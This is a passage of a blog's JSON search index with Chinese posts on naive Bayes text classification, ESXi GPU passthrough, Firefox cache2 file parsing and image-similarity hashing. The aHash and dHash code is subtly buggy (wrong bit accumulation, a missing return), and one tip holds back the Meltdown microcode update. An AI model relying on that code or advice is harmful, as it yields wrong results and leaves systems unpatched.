{P(云)} $\nP(雨)：下雨的概率 = 10% P(云|雨)：下雨时有云的概率 = 50% P(云)：有云的概率 = 40% $ P(雨|云) = \\dfrac {0.1 * 0.5} {0.4} = 0.125 $\n例子2：\n有一种疾病检测手段，但是这种检测手段并不准确\n在真正有这种疾病的人中有 80% 的人可以被检测出 对于没有这种疾病的人有 10% 的概率会被错误检测出 以往的统计数据表明人群中有 1% 的人得了这种疾病，99% 的人没有得过 请问，当有一个人被检测出有该疾病时他真正有这种病的概率是多少？\n$ P(真有病|检测有病) = \\dfrac {P(真有病) * P(检测有病|真有病)} {P(检测有病)} $\n真实情况 \\ 检测结果 检测有病 检测没病 得病统计 真有病 80% 20% 1% 真没病 10% 90% 99% P(真有病)：1% P(检测有病|真有病)：80% P(检测有病)：P(没有病的人被检测出有病的概率) + P(真有病的人被检测出有病的概率) P(没有病的人被检测出有病的概率) = P(真没病) * P(检测有病|真没病) = 99% * 10% = 0.099 P(真有病的人被检测出有病的概率) = P(真有病) * P(检测有病|真有病) = 1% * 80% = 0.008 $ P(真有病|检测有病) = \\dfrac {1% * 80%} { 99% * 10% + 1% * 80%} = 7.48% $\n示意图：\n计算方法：\n那么怎么评估这个方法是否有效呢？可以使用准确度（Precision）和召回（Recall）两个指标来评估。\n$ Precision = \\dfrac {TP} {TP + FP} = \\dfrac {P(真有病) * P(检测有病|真有病)} {P(检测有病)} = \\dfrac {1% * 80%} {1% * 80% + 99% * 10%} = 7.48%$\n$ Recall = \\dfrac {TP} {TP + FN} = \\dfrac {P(真有病) * P(检测有病|真有病)} {P(真有病)} = \\dfrac {1% * 80%} {1%} = 80% $\n3.贝叶斯定理在机器学习中的应用 - 文本分类 **任务目标：**通过利用一批分好类（2类：正常/非正常）的文本信息，训练一个模型来识别一段给定文字，判断是不是正常言论。\n$ P(类别|数据) = \\dfrac {P(类别) * P(数据|类别)} {P(数据)} $\n当 P(正常|数据) \u0026gt; P(不正常|数据) 时认为文本为“正常” 当 P(正常|数据) \u0026lt; P(不正常|数据) 时认为文本为“不正常” 算法推导：\n进一步把问题转换成下面的表达方式：\n$ P(class|words) = \\dfrac {P(words|class) * P(class)} {P(words)} $\nclass：代表类别 words：代表一句话，它是由一组单词构成的，记做：w0, w1, w2, \u0026hellip;, wn $ P(class|w0, w0, w1, w2, \u0026hellip;, wn) = \\dfrac {P(w0, w1, w2, \u0026hellip;, wn|class) * P(class)} {P(w0, w1, w2, \u0026hellip;, wn)} $\n由于 P(w0, w1, w2, \u0026hellip;, wn|class) 非常难于计算因此通过条件独立性假设把这个概率进行简化计算，最终转换成计算 P(w0|class)P(w1|class)P(w2|class)\u0026hellip;P(wn|class)。\n$ P(class|w0, w0, w1, w2, \u0026hellip;, wn) = \\dfrac {P(w0|class)*P(w1|class)*P(w2|class)\u0026hellip;P(wn|class) * P(class)} {P(w0, w1, w2, \u0026hellip;, wn)} $\n训练方法就转换成根据已提供的数据计算下列概率值得过程：\n每个类别中出现某个单词的概率 P(w0|class), P(w1|class), P(w2|class)\u0026hellip;P(wn|class) 训练数据中某个类别的概率 P(class) 比较 P(class1|w0, w0, w1, w2, \u0026hellip;, wn) P(class2|w0, w0, w1, w2, \u0026hellip;, wn) 可以简化成比较\n$ P(w0|class1)*P(w1|class1)*P(w2|class1)\u0026hellip;P(wn|class1) * P(class1) $\n$ P(w0|class2)*P(w1|class2)*P(w2|class2)\u0026hellip;P(wn|class2) * P(class2) $\n**注意：**实际计算中很少直接使用这样的乘法进行计算，主要原因是：\n乘法运算计算量相对加法来说是复杂很多的 由于每一项 P(wn|class1) 值很小或者为0（有时为了避免所有项为0会把每一项给一个初始化很小的数字），因此容易导致计算结果直接为0或者由于太小造成下溢出 所以，在实际情况下多使用 log 运算，根据 log 的性质可以进一步简化成比较：\n$ log(P(w0|class1)*P(w1|class1)*P(w2|class1)\u0026hellip;P(wn|class1) * P(class1)) = log(P(w0|class1) + log(P(w1|class1) + log(P(w2|class1) + \u0026hellip; + log(P(wn|class1) + log(class1)$\n$ log(P(w0|class2)*P(w1|class2)*P(w2|class2)\u0026hellip;P(wn|class2) * P(class2)) = log(P(w0|class2) + log(P(w1|class2) + log(P(w2|class2) + \u0026hellip; + log(P(wn|class2) + log(class2)$\n另外使用 log 进行计算还有额外的好处：\n首先是直接将乘法运算转换成了加法，计算速度得到提升 每一项 log(P(wn|class) 都可以在训练阶段固化，操作中可以直接用查表法解决进一步减少运算量 最后，引用一下来自《机器学习实战》的例子：\nfrom numpy import * def loadDataSet(): postingList=[[\u0026#39;my\u0026#39;, \u0026#39;dog\u0026#39;, \u0026#39;has\u0026#39;, \u0026#39;flea\u0026#39;, \u0026#39;problems\u0026#39;, \u0026#39;help\u0026#39;, \u0026#39;please\u0026#39;], [\u0026#39;maybe\u0026#39;, \u0026#39;not\u0026#39;, \u0026#39;take\u0026#39;, \u0026#39;him\u0026#39;, \u0026#39;to\u0026#39;, \u0026#39;dog\u0026#39;, \u0026#39;park\u0026#39;, \u0026#39;stupid\u0026#39;], [\u0026#39;my\u0026#39;, \u0026#39;dalmation\u0026#39;, \u0026#39;is\u0026#39;, \u0026#39;so\u0026#39;, \u0026#39;cute\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;love\u0026#39;, \u0026#39;him\u0026#39;], [\u0026#39;stop\u0026#39;, \u0026#39;posting\u0026#39;, \u0026#39;stupid\u0026#39;, \u0026#39;worthless\u0026#39;, \u0026#39;garbage\u0026#39;], [\u0026#39;mr\u0026#39;, \u0026#39;licks\u0026#39;, \u0026#39;ate\u0026#39;, \u0026#39;my\u0026#39;, \u0026#39;steak\u0026#39;, \u0026#39;how\u0026#39;, \u0026#39;to\u0026#39;, \u0026#39;stop\u0026#39;, \u0026#39;him\u0026#39;], [\u0026#39;quit\u0026#39;, \u0026#39;buying\u0026#39;, \u0026#39;worthless\u0026#39;, \u0026#39;dog\u0026#39;, \u0026#39;food\u0026#39;, \u0026#39;stupid\u0026#39;]] classVec = [0,1,0,1,0,1] #1 is abusive, 0 not return postingList,classVec def createVocabList(dataSet): vocabSet = set([]) #create empty set for document in dataSet: vocabSet = vocabSet | set(document) #union of the two sets return list(vocabSet) def setOfWords2Vec(vocabList, inputSet): returnVec = [0]*len(vocabList) for word in inputSet: if word in vocabList: returnVec[vocabList.index(word)] = 1 else: print(\u0026#34;the word: %s is not in my Vocabulary!\u0026#34; % word) return returnVec def trainNB0(trainMatrix,trainCategory): numTrainDocs = len(trainMatrix) numWords = len(trainMatrix[0]) pAbusive = sum(trainCategory)/float(numTrainDocs) p0Num = ones(numWords); p1Num = ones(numWords) #change to ones()，备注：初始化成1避免该项为0的情况发生 p0Denom = 2.0; p1Denom = 2.0 #change to 2.0 for i in range(numTrainDocs): if trainCategory[i] == 1: p1Num += trainMatrix[i] p1Denom += sum(trainMatrix[i]) else: p0Num += trainMatrix[i] p0Denom += sum(trainMatrix[i]) p1Vect = log(p1Num/p1Denom) #change to log() p0Vect = log(p0Num/p0Denom) #change to log() return p0Vect,p1Vect,pAbusive def classifyNB(vec2Classify, p0Vec, p1Vec, pClass1): p1 = sum(vec2Classify * p1Vec) + log(pClass1) #element-wise mult p0 = sum(vec2Classify * p0Vec) + log(1.0 - pClass1) if p1 \u0026gt; p0: return 1 else: return 0 def testingNB(): listOPosts,listClasses = loadDataSet() myVocabList = createVocabList(listOPosts) trainMat=[] for postinDoc in listOPosts: trainMat.append(setOfWords2Vec(myVocabList, postinDoc)) p0V,p1V,pAb = trainNB0(array(trainMat),array(listClasses)) testEntry = [\u0026#39;love\u0026#39;, \u0026#39;my\u0026#39;, \u0026#39;dalmation\u0026#39;] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print(testEntry,\u0026#39;classified as: \u0026#39;,classifyNB(thisDoc,p0V,p1V,pAb)) testEntry = [\u0026#39;stupid\u0026#39;, \u0026#39;garbage\u0026#39;] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print(testEntry,\u0026#39;classified as: \u0026#39;,classifyNB(thisDoc,p0V,p1V,pAb)) 第一步：加载已分类数据，并创建词典 listOPosts,listClasses = loadDataSet() myVocabList = createVocabList(listOPosts) print(\u0026#39;All posts:\u0026#39;) print(\u0026#39;-\u0026#39;*80) print(listOPosts) print(\u0026#39;\\n\u0026#39;) print(\u0026#39;Vocabulary:\u0026#39;) print(\u0026#39;-\u0026#39;*80) print(myVocabList) All posts: -------------------------------------------------------------------------------- [['my', 'dog', 'has', 'flea', 'problems', 'help', 'please'], ['maybe', 'not', 'take', 'him', 'to', 'dog', 'park', 'stupid'], ['my', 'dalmation', 'is', 'so', 'cute', 'I', 'love', 'him'], ['stop', 'posting', 'stupid', 'worthless', 'garbage'], ['mr', 'licks', 'ate', 'my', 'steak', 'how', 'to', 'stop', 'him'], ['quit', 'buying', 'worthless', 'dog', 'food', 'stupid']] Vocabulary: -------------------------------------------------------------------------------- ['to', 'mr', 'quit', 'take', 'my', 'dalmation', 'is', 'has', 'flea', 'stop', 'worthless', 'him', 'problems', 'cute', 'maybe', 'I', 'so', 'not', 'buying', 'help', 'how', 'park', 'food', 'garbage', 'steak', 'please', 'dog', 'ate', 'licks', 'posting', 'love', 'stupid'] 第二步：将词典数据转换成可计算的向量 trainMat=[] for postinDoc in listOPosts: trainMat.append(setOfWords2Vec(myVocabList, postinDoc)) 第三步：训练模型 p0V,p1V,pAb = trainNB0(array(trainMat),array(listClasses)) 最后：测试模型 testEntry = [\u0026#39;love\u0026#39;, \u0026#39;my\u0026#39;, \u0026#39;dalmation\u0026#39;] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print(testEntry,\u0026#39;classified as: \u0026#39;,classifyNB(thisDoc,p0V,p1V,pAb)) testEntry = [\u0026#39;stupid\u0026#39;, \u0026#39;garbage\u0026#39;] thisDoc = array(setOfWords2Vec(myVocabList, testEntry)) print(testEntry,\u0026#39;classified as: \u0026#39;,classifyNB(thisDoc,p0V,p1V,pAb)) ['love', 'my', 'dalmation'] classified as: 0 ['stupid', 'garbage'] classified as: 1", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/bayes-classification\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E8%B4%9D%E5%8F%B6%E6%96%AF\/": {
        
        "title": "贝叶斯",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E8%B4%9D%E5%8F%B6%E6%96%AF\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/devops\/": {
        
        "title": "Devops",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/devops\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/devops\/": {
        
        "title": "DevOps",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/devops\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/gpu\/": {
        
        "title": "GPU",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/gpu\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/nvidia\/": {
        
        "title": "Nvidia",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/nvidia\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/passthrough\/": {
        
        "title": "Passthrough",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/passthrough\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/vmware\/": {
        
        "title": "Vmware",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/vmware\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/devops\/esxi-nvidia-passthrough\/": {
        
        "title": "VMware ESXi 6.7.0 update2 使用 GPU Passthrough 模式的坑",
            "tags": [ "devops",  "vmware",  "nvidia",  "GPU",  "passthrough", ],
    "content": " 最近新买的服务器上安装了 ESXi v6.7.0 update 2，想把手上的一块显卡配起来在虚拟机中使用，查了官方资料发现可以使用直通（PassThrough）模式让虚拟机直接使用显卡。配置 ESXi 的过程还是基本顺利的，可是在把显卡分配给 Ubuntu 18.04 虚拟机时却碰到了意想不到的问题。\nESXi 配置显卡直通（PassThorugh）模式 这里主要列出配置的关键点不展开说明。配置的方法过程可以参考这篇文档：\nhttps://blogs.vmware.com/apps/2018/04/how-enable-compute-accelerators-vsphere-6-5-machine-learning-hpc-workloads.html\n如果使用 vGPU 的模式进行配置时需要在 ESXi 中安装对应的驱动，如果是NVidia显卡可以从这里下载，不过多数家用级的 GPU 本身不支持这种模式，所以安装之前最好确认一下。\nhttps://www.nvidia.com/drivers/results/116135\n另外，服务器的 BIOS 需要进行正确设置，主要是查看 VT-D / IOMMU / SR-IOV 相关的设置\n安装虚拟机 安装完 Ubuntu 18.04 后问题就接踵而至。\n第一个坑：虚拟机类型 原本按照默认的 ESXi 6.7 类型创建虚拟机但无论后面怎么设置都无法让驱动跟显卡正常工作，这里一定要选择 ESXi 6.7 U2 类型的机器。\n第二个坑：内存预留 创建虚拟机时的默认配置不会将虚拟机的内存选项设置成“预留所有客户机内存 (全部锁定)”，但在使用 GPU PassThrough 的情况下需要把这个选项打开才行。\n第三个坑：添加参数 hypervisor.cpuid.v0 = \u0026ldquo;FALSE\u0026rdquo; 一定要添加这个参数，让驱动把虚拟机当做物理机来处理。\n第四个坑：Ubuntu 18.04 虚机升级系统后重启黑屏 这个问题折腾了很久才弄明白是由于升级 Intel CPU 的微代码固件（Meltdown安全漏洞）造成的，为了能够使用虚拟机只能放弃这个固件的升级：\n$ sudo apt-mark hold intel-microcode 该问题的讨论可以参考这个帖子：https://askubuntu.com/questions/1155634/intel-microcode-package-upgrade-in-ubuntu-18-04-leads-to-unbootable-system\n第五个坑：系统自带 nouveau 驱动造成 nvidia 驱动无法加载 在虚拟机中安装 NVidia 驱动后重启系统后，正常情况可以看到系统正常加载 nvidia 驱动。\n安装 NVidia 驱动方法：\n$ sudo apt install gcc g++ make $ sudo apt-get install nvidia-driver-410 xserver-xorg-video-nvidia-410 libnvidia-compute-410 libnvidia-decode-410 libnvidia-encode-410 libnvidia-ifr1-410 libnvidia-fbc1-410 libnvidia-gl-410 xorg-video-abi-23 但重启虚拟机后会发现有时系统会正常加载 nvidia.ko 驱动，有时会加载 nouveau.ko 驱动，造成无法正常使用显卡。\n驱动加载的确认方法可以用 \u0026rsquo;lsmod | grep nvidia\u0026rsquo; 或 \u0026rsquo;lsmod | grep nouveau\u0026rsquo; 命令。\n可以用下面这个比较暴力的方法禁用 nouveau 驱动：\nsudo mv /lib/modules/4.18.0-25-generic/kernel/drivers/gpu/drm/nouveau/nouveau.ko /lib/modules/4.18.0-25-generic/kernel/drivers/gpu/drm/nouveau/nouveau.ko.disabled 这里多说一些禁用 nouveau 驱动过程中碰到的坑：\n失败经历1：在 grub 及系统加载模块中禁用 nouveau\n使用这个方法我发现在 Ubuntu 18.04 虚机启动后有时会正确加载 nvidia 驱动，有时却依然会加载 nouveau，确认的方法可以用 \u0026rsquo;lsmod | grep nvidia\u0026rsquo; 或 \u0026rsquo;lsmod | grep nouveau\u0026rsquo; 命令来确认。\n在此把这个方法记录下来，也可能对别的虚拟机有效。\n第一步：在 grub 中禁止 nouveau\n先把下面的配置添加到 /etc/default/grub 文件中\nGRUB_CMDLINE_LINUX=\u0026#34;nouveau.blacklist=1\u0026#34; 然后更新 grub：\n$ sudo update-grub 第二步：禁用 modprobe\n创建文件 \u0026lsquo;/etc/modprobe.d/nvidia-graphics-drivers.conf\u0026rsquo;，在其中添加下面内容：\nblacklist nouveau blacklist lbm-nouveau alias nouveau off alias lbm-nouveau off options nouveau modeset=0 Then update initrd:\n$ sudo update-initramfs -u $ sudo reboot **失败经历2：在 gdm 中禁用 Wayland **\n参考了这个讨论后尝试后问题依然存在 https://askubuntu.com/questions/1031511/cant-disable-nouveau-drivers-in-ubuntu-18-04\n查看 gdm 是否使用 wayland 模式的方法：\n$ loginctl SESSION UID USER SEAT TTY 2 1000 velix seat0 tty2 c2 1000 velix c1 120 gdm seat0 tty1 The command loginctl show-session \u0026lt;session-n\u0026gt; -p Type show the session type: $ loginctl show-session c1 -p Type Type=Wayland 在 gdm 配置文件 /etc/gdm3/custom.conf 中禁用的方法是添加下面一行配置后重启系统：\nWaylandEnable=false. 趟过去上面几个坑之后就可以正常的在 Ubuntu 18.04 虚拟机中使用显卡直通模式了。\n$ nvidia-smi Thu Aug 8 17:31:13 2019 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 410.48 Driver Version: 410.48 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 GeForce GTX 108... Off | 00000000:03:00.0 Off | N/A | | 0% 50C P8 18W / 250W | 1001MiB / 11178MiB | 0% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | 0 4913 C /conda/envs/cudf/bin/python 191MiB | | 0 10664 C /home/jupyter/testing-libgdf 203MiB | | 0 10871 C /conda/envs/cudf/bin/python 191MiB | | 0 11730 C /conda/envs/cudf/bin/python 203MiB | | 0 11826 C /conda/envs/cudf/bin/python 203MiB | +-----------------------------------------------------------------------------+ ", 
    "url": "http:\/\/localhost:1313\/post\/devops\/esxi-nvidia-passthrough\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/cache2\/": {
        
        "title": "Cache2",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/cache2\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/firefox\/": {
        
        "title": "Firefox",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/firefox\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/firefox-cache2\/": {
        
        "title": "Firefox cache2 数据结构解析",
            "tags": [ "Firefox",  "cache2",  "缓存", ],
    "content": " 开始研究firefox磁盘保存的文件格式源于最近使用selenium做爬虫抓数据时需要下载爬取时的图片碰到的一些问题。\n先简单说一下最开始使用selenium下载图片时摸索出的几个办法：\n方法 优点 缺点 使用requests包直接访问图片资源并保存成文件 可以直接下载原始图片文件 增大网络流量及耗时 使用webdriver找到图片元素，调用snapshot()保存图片 操作简单 chromedriver工作正常，但firefox的geckodriver下载图片位置存在偏差。图片保存格式为png，并且尺寸有偏差。 用webdriver在新页面中打开图片，再用snapshot()方法进行保存 可以解决上面firefox保存图片的问题 图片格式为png，操作费时 找到图片在页面上的具体位置，使用snapshot()针对坐标位置进行截图 可以解决上面firefox保存图片偏差的问题 保存格式为png，并且难以控制图片尺寸 上面几个方法虽然可以靠时间和后续处理解决问题，但是都不是很好的方法。之后想到了浏览器对图片应该使用缓存进行处理，于是就想是否可以通过查看磁盘上保存的浏览器缓存数据找到需要保存的图片资源。经过一番研究后基本搞明白了firefox的 cache2缓存文件的格式，下面对缓存文件格式做个分析。\nFirefox cache2 文件目录结构 Firefox在用户的profile目录中保存缓存文件结构，可以通过在firefox地址输入框中输入\u0026rsquo;about:profiles\u0026rsquo;查看当前用户的profile目录。\n在profile中找到\u0026rsquo;cache2\u0026rsquo;目录，该目录保存了浏览器的缓存数据。其中主要内容有两个：\n\u0026lsquo;index\u0026rsquo;文件：该文件是缓存的索引文件，记录了每一个被缓存在本地磁盘上的缓存文件的基本元信息，比如缓存记录的使用频率、过期时间、文件大小等\u0026hellip; \u0026rsquo;entries\u0026rsquo;目录：目录中的每一个文件对应一个被浏览器缓存的数据文件，并且文件使用特定的数据格式存储了相应的元信息，比较重要的信息有URL $ ls AlternateServices.txt cache2 extensions.json pkcs11.txt startupCache OfflineCache cert9.db favicons.sqlite places.sqlite storage SecurityPreloadState.txt compatibility.ini formhistory.sqlite pluginreg.dat storage-sync.sqlite SiteSecurityServiceState.txt containers.json gmp prefs.js storage.sqlite TRRBlacklist.txt content-prefs.sqlite gmp-gmpopenh264 safebrowsing thumbnails addonStartup.json.lz4 cookies.sqlite gmp-widevinecdm saved-telemetry-pings times.json addons.json crashes handlers.json search.json.mozlz4 weave blocklist.xml datareporting key4.db sessionCheckpoints.json webappsstore.sqlite bookmarkbackups extension-preferences.json minidumps sessionstore-backups webappsstore.sqlite-shm broadcast-listeners.json extensions permissions.sqlite sessionstore.jsonlz4 xulstore.json $ ls cache2/ doomed entries index index.log $ ls cache2/entries/ 017239BD353C39FEF561AD4878BC169D5B89D5FA 5D032C390BFDCC43406BE001CADB00C017762B77 B25D0FBB9AD160F3CA160ED3E26BFF9F0E274929 026860131AC8837A36968B435E640BDD30992E73 5D2DC9AE83B62B8763A0C14BDB89C4C45EFA111D B2BB561C0A27E72044D3AEE5425F4E5A8F0348E2 04465FB4C96F61466B9A67422B84ECC5F3EDEBC6 5E4954707B44E5A4B4ACF5F22B52219A1DCA477F B35B9720DB46BE7509AD4A253DDA32F12CEFFBC8 04978A7A83CF7B8511841F4A26598987807DBC89 5F34A74D1380D10E61240C4B94321E6D5B7812DB B412652745622FCEAC058F3F08A728999A3B4664 04D7BC87034DE29F67E22BAA58D84F3D1C64E15A 5FE950976304D0FC774A22F674AF6B00E8528C88 B4160F7B008034AC71D5F250245DFE39FBEEC360 06B62E73358EF1CBB9F8B4068FB133EE20D83FBF 601487B53548B7563ABB522C9452E066D0E8F82B B428F0BFE97CCBEF8F796B282FAF44664A4B0328 07D9B3A9557270C7517C771711663C8F78019C12 6059AD83AC6E3CFF4FEE798D7BD32709ED3F51DE B45040B5F7F65C61AF516477B393B2C3129BEA9A 0843F8C54EDE9BDFABABDB50655BB7CD89945828 609B40F6174E219E48CD0A82ECF3ADE83FFE90B6 B4E19E0CA4676E3E873F580DB210101AB849FBA6 ... 缓存index文件格式 文件使用Big-endian字节序，文件由1个文件头及后续多个描述缓存文件的数据块构成，每一块描述一个对应的缓存文件。\n偏移 Size 内容 0x0 12 Bytes 文件头 0xC 36 Bytes 第一个缓存文件描述块 0x30 36 Bytes 第二个缓存文件描述块 \u0026hellip; \u0026hellip; \u0026hellip; 0xC+N*0x24 36 Bytes 第N个缓存文件描述块 文件头具体结构如下：\n偏移 size 内容 0x0 4 Bytes 版本号 0x4 4 Bytes 最后一次更新时间戳 0x8 4 Bytes 脏数据标记 每一个缓存描述块内部结构如下：\n内部偏移 size 内容 0x0 20 Bytes 缓存文件key（\u0026rsquo;:\u0026rsquo;+URL）的sha1 0x14 4 Bytes 使用频率 0x18 4 Bytes 过期时间 0x1C 4 Bytes app ID 0x20 1 Bytes 缓存文件flag 0x21 3 Bytes 缓存文件大小 缓存文件格式 \u0026lsquo;cache2/entries\u0026rsquo;目录中的每个文件用来记录一个被缓存的文件，文件内容也是Big-endian，文件格式如下：\n偏移 size 内容 0x0 缓存文件大小 被缓存文件内容 紧接着缓存数据 4+n_chunk*2 暂时还不清楚其中具体内容，不过文件URL信息不在其中 紧接着上面的位置 可变长度 被缓存文件元信息 文件最后 4 Bytes 被缓存文件内容的尺寸 n_chunk的计算方法是“(被缓存文件尺寸+256k-1)/256k”。\n从上面的结构看，解析缓存文件第一步就是从最后4个字节找到缓存文件尺寸，从而找到对应的元信息。元信息中包含了最重要的缓存文件的key ID信息，key ID包含了缓存数据的URL。\n元信息格式：\n内部偏移 尺寸 内容 0x0 4 Bytes 版本信息 0x4 4 Bytes 被获取数量 0x8 4 Bytes 上次获取时间戳 0xC 4 Bytes 上次修改时间戳 0x10 4 Bytes 超时时间戳 0x14 4 Bytes key的字节长度 0x18 4 Bytes 标志位信息 0x1C 0x14中的key尺寸 key信息 \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip; \u0026hellip; 请求信息 解析代码 做了个简单的cache2缓存文件解析程序：\nhttps://github.com/singleye/FirefoxCache2\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/firefox-cache2\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/": {
        
        "title": "Web",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E7%BC%93%E5%AD%98\/": {
        
        "title": "缓存",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E7%BC%93%E5%AD%98\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ahash-dhash-phash\/": {
        
        "title": "Ahash, Dhash, Phash",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ahash-dhash-phash\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/cv\/similarity\/": {
        
        "title": "哈希计算图片相似性",
            "tags": [ "ahash, dhash, phash",  "tag2", ],
    "content": " aHash（平均哈希） 将图片缩小到8x8的尺寸 将缩小后的图片转换成灰度图 计算8x8图片所有像素灰度值的平均值 创建一个新的8x8矩阵，矩阵的每个值取值为0或1，计算方法是将原矩阵中对应像素的的灰度值与平均值进行对比，当大于等于平均值时记1，小于平均值时记0 def ahash(filepath): img = cv2.imread(filepath) small = cv2.resize(img, (8, 8), interpolation=cv2.INTER_AREA) gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY) fp = 0 mean = gray.mean() w, h = gray.shape for x in range(w): for y in range(h): if gray[x][y] \u0026gt;= mean: fp += ((fp \u0026lt;\u0026lt; 1) + 1) else: fp += ((fp \u0026lt;\u0026lt; 1) + 0) return fp dHash（差值哈希） def dhash(filepath): img = cv2.imread(filepath) small = cv2.resize(img, (9, 8), interpolation=cv2.INTER_AREA) gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY) fp = 0 mean = gray.mean() w, h = gray.shape for x in range(w-1): for y in range(h): # if the pixel on the left is brighter mark it as 1 if gray[x][y] \u0026gt; gray[x+1][y]: fp += ((fp \u0026lt;\u0026lt; 1) + 1) else: fp += ((fp \u0026lt;\u0026lt; 1) + 0) pHash（感知哈希） pHash算法主要是使用了离散余弦变换（DCT）进行转换。\n利用感知哈希算法计算图片相似度 计算步骤：\n缩放图片：一般大小为32*32，这样方便DCT计算\n简化色彩，转化为灰度图：可以使用Image的convert(\u0026lsquo;L\u0026rsquo;)方法\n计算DCT（离散余弦变换）:\n获得图像的二维数据矩阵f(x,y)\n求离散余弦变换的系数矩阵[A]\n求系数矩阵对应的转置矩阵[A]T\n根据公式[F(u,v)]=[A][f(x,y)][A]T 计算离散余弦变换 缩小DCT：DCT计算后的矩阵是3232，保留左上角的88，这些代表的图片的最低频率\n计算平均值：计算缩小DCT后的所有像素点的平均\n进一步减小DCT：大于平均值记录为1，否则为0\n得到64位信息指纹\n记录两张图片的图像指纹的汉明距离，计算图片相似度\ndef phash(filepath, shape=(1, 1)): fp = np.zeros(shape, dtype=np.ulonglong) try: img = cv2.imread(filepath) resize = cv2.resize(img, (32, 32)) gray = cv2.cvtColor(resize, cv2.COLOR_BGR2GRAY) except Exception as e: print(\u0026#39;-\u0026#39;*80) print(\u0026#39;Exception: image [%s]\u0026#39; % filepath) print(e) print(\u0026#39;-\u0026#39;*80) return fp left_upper = cv2.dct(gray.astype(float))[:8, :8] mean = left_upper.mean() h, w = left_upper.shape for x in range(w): for y in range(h): val = int(fp[y//8, x//8]) if left_upper[y, x] \u0026gt;= mean: fp[y//8, x//8] = ((val \u0026lt;\u0026lt; 1) | 1) else: fp[y//8, x//8] = ((val \u0026lt;\u0026lt; 1) | 0) return fp 直方图 https://github.com/nivance/image-similarity\nhttps://github.com/nivance/image-similarity/blob/master/src/main/java/image/similarity/ImageHistogram.java\n直方图算法是对源图像与要筛选的图像进行直方图数据采集，对采集的各自图像直方图进行归一化再使用巴氏系数算法对直方图数据进行计算，最终得出图像相似度值，其值范围在[0, 1]之间0表示极其不同，1表示极其相似（相同）。\n算法步骤大致可以分为两步，根据源图像与候选图像的像素数据，生成各自直方图数据。第二步：使用第一步输出的直方图结果，运用巴氏系数（Bhattacharyya coefficient）算法，计算出相似程度值。\n第一步：直方图计算 直方图分为灰度直方图与RGB直方图，对于灰度图像直方图计算十分简单，只要初始化一个大小为256的直方图数组H，然后根据像素值完成频率分布统计，假设像素值为124，则H[124] += 1, 而对于彩色RGB像素来说直方图表达有两种方式，一种是单一直方图，另外一种是三维直方图，三维直方图比较简单明了，分别对应RGB三种颜色，定义三个直方图HR,HG, HB, 假设某一个像素点P的RGB值为(4, 231,129), 则对于的直方图计算为HR[4] += 1,HG[231] += 1, HB[129] += 1, 如此对每个像素点完成统计以后，RGB彩色直方图数据就生成了。 而RGB像素的单一直方图SH表示稍微复杂点，每个颜色的值范围为0 ~ 255之间的，假设可以分为一定范围等份，当8等份时，每个等份的值范围为32， 16等份时，每个等份值范围为16，当4等份时候，每个等份值的范围为64，假设RGB值为(14, 68, 221), 16等份之后，它对应直方图索引值(index)分别为: (0, 4, 13), 根据计算索引值公式:index = R + G * 16 + B * 16 * 16 对应的直方图index = 0 + 4 * 16 + 13 * 16 * 16， SH[3392] += 1如此遍历所有RGB像素值，完成直方图数据计算。\n第二步：巴氏系数计算，计算公式如下：$\\sum_{i=1}^N\\sqrt{p(i)p^{\u0026rsquo;}(i)}$ 。其中p, p\u0026rsquo;分别代表源与候选的图像直方图数据，对每个相同i的数据点乘积开平方以后相加得出的结果即为图像相似度值（巴氏系数因子值），范围为0到1之间。\nBhattacharyya Coefficient 其他思想 大津法 Otsu Thresholding 阮一峰blog 1979年，日本学者大津展之证明了，\u0026ldquo;类内差异最小\u0026quot;与\u0026quot;类间差异最大\u0026quot;是同一件事，即对应同一个阈值。他提出一种简单的算法，可以求出这个阈值，这被称为\u0026quot;大津法\u0026rdquo;（Otsu\u0026rsquo;s method）。下面就是他的计算方法。\n假定一张图片共有n个像素，其中灰度值小于阈值的像素为 n1 个，大于等于阈值的像素为 n2 